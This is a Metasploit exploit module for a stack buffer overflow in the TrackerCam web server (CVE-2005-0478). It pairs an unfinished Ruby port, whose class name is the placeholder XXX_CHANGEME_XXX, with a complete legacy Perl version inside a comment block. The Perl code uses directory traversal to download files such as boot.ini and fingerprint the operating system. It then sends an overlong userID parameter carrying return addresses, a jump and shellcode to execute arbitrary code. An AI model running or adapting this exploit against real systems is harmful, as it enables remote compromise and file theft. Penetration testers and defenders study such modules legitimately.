require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'TrackerCam PHP Argument Buffer Overflow',
			'Description'    => %q{
				This module exploits a simple stack overflow in the
				TrackerCam web server. All current versions of this software
				are vulnerable to a large number of security issues. This
				module abuses the directory traversal flaw to gain
				information about the system and then uses the PHP overflow
				to execute arbitrary code.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '13953'],
					[ 'OSVDB', '13955'],
					[ 'CVE', '2005-0478'],
					[ 'BID', '12592'],
					[ 'URL', 'http://aluigi.altervista.org/adv/tcambof-adv.txt'],
					[ 'MIL', '69'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::trackercam_phparg_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'TrackerCam PHP Argument Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32'],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'thread' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8090],
	  },

	'Payload' =>
	  {
		'Space'		=> 2048,
		'BadChars'	=> "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
		'Prepend'	=> "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a simple stack overflow in the TrackerCam web
	server. All current versions of this software are vulnerable to a large
	number of security issues. This module abuses the directory traversal
	flaw to gain information about the system and then uses the PHP overflow
	to execute arbitrary code.
}),

	'Refs'    =>
	  [
		['OSVDB', '13953'],
		['OSVDB', '13955'],
		['CVE', '2005-0478'],
		['BID', '12592'],
		['URL', 'http://aluigi.altervista.org/adv/tcambof-adv.txt'],
		['MIL', '69'],
	  ],

	'Targets' =>
	  [

		# EyeWD.exe has a null and we can not use a partial overwrite.
		# All of the loaded application DLLs have a null in the address...
		# Except CPS.dl, which moves around between instances.

		# Windows XP SP2 and Windows 2003 are not supported yet :-/

		['Windows 2000 English',		0x75022ac4 ], # ws2help.dll
		['Windows XP English SP0/SP1',	0x71aa32ad ], # ws2help.dll
		['Windows NT 4.0 SP4/SP5/SP6',	0x77681799 ], # ws2help.dll
	  ],

	'Keys'    => ['trackercam'],

	'DisclosureDate' => 'Feb 18 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $s = $self->Connect;

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$self->PrintLine("[*] Querying the remote web server...");

	my $path = "/tuner/ComGetLogFile.php3?fn=../HTTPRoot/socket.php3";
	my $req  = "GET $path HTTP/1.0\r\n\r\n";

	$s->Send($req);
	my $res = $s->Recv(-1, 5);
	$s->Close;

	if ($res =~ /fsockopen/) {
		$self->PrintLine("[*] Vulnerable TrackerCam instance discovered");
		$self->Fingerprint();
		return $self->CheckCode('Confirmed');
	}

	$self->PrintLine("[*] This TrackerCam service appears to be patched");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self		= shift;
	my $target_idx	= $self->GetVar('TARGET');
	my $shellcode	= $self->GetVar('EncodedPayload')->Payload;
	my $target		= $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = $self->Connect;

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $bang = Pex::Text::EnglishText(8192);

	# Simple as pie.
	substr($bang, 257, 4, pack('V', $target->[1]));
	substr($bang, 253, 2, "\xeb\x06");
	substr($bang, 261, length($shellcode), $shellcode);

	my $data  = "GET /tuner/TunerGuide.php3?userID=$bang HTTP/1.0\r\n\r\n";

	$self->PrintLine("[*] Sending " .length($data) . " bytes to remote host.");
	$s->Send($data);
	$s->Recv(-1, 5);

	return;
}

# Uses the directory traversal vulnerability to detect the remote OS version
sub Fingerprint {
	my $self = shift;
	my $data = $self->DownloadFile('nobody.txt');

	if (! $data ) {
		$self->PrintLine("[*] Download failed for remote test file");
		return;
	}

	my ($path) = $data =~ m/in <b>(.*)<\/b> on line/smi;
	$self->PrintLine("[*] Install path: $path") if $path;

	if (uc(substr($path, 0, 1)) ne 'C') {
		$self->PrintLine("[*] TrackerCam is probably not installed on the system drive");
	}

	if ($data !~ /Program Files/) {
		$self->PrintLine("[*] TrackerCam is installed in a non-standard location");

	}

	$data = $self->DownloadFile('boot.ini');
	if (! $data ) {
		$self->PrintLine("[*] Download failed for remote boot.ini file");
		return;
	}

	# Windows XP SP2
	if ($data =~ /Windows XP.*NoExecute/i) {
		$self->PrintLine("[*] Detected Windows XP SP2");
		return 'WinXPSP2';
	}

	if ($data =~ /Windows XP/) {
		$self->PrintLine("[*] Detected Windows XP SP0-SP1");
		return 'WinXPSP01';
	}

	if ($data =~ /Windows.*2003/) {
		$self->PrintLine("[*] Detected Windows 2003 Server");
		return 'Win2003';
	}

	if ($data =~ /Windows.*2000/) {
		$self->PrintLine("[*] Detected Windows 2000");
		return 'Win2000';
	}

	$self->PrintLine("[*] Could not identify this system");
	return;
}

sub DownloadFile {
	my $self = shift;
	my $file = shift;

	my $s = $self->Connect;
	return if $s->IsError;

	my $path = "/tuner/ComGetLogFile.php3?fn=../../../../../../../../../$file";
	my $req  = "GET $path HTTP/1.0\r\n\r\n";

	$s->Send($req);
	my $res = $s->Recv(8192, 5);
	$s->Close;

	return if ($res !~ /tuner\.css/ || $res !~ /\<pre\>/ );

	my ($data) = $res =~ m/<pre>(.*)/smi;
	$data =~ s/<\/pre><\/body>.*//g if $data;

	return $res if ! $data;
	return $data;
}

sub Connect {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'	=> $self->GetVar('RHOST'),
		'PeerPort'	=> $self->GetVar('RPORT'),
		'SSL'		=> $self->GetVar('SSL'),
		'LocalPort'	=> $self->GetVar('CPORT'),
	  );
	return $s;
}

1;


=end


end
end	
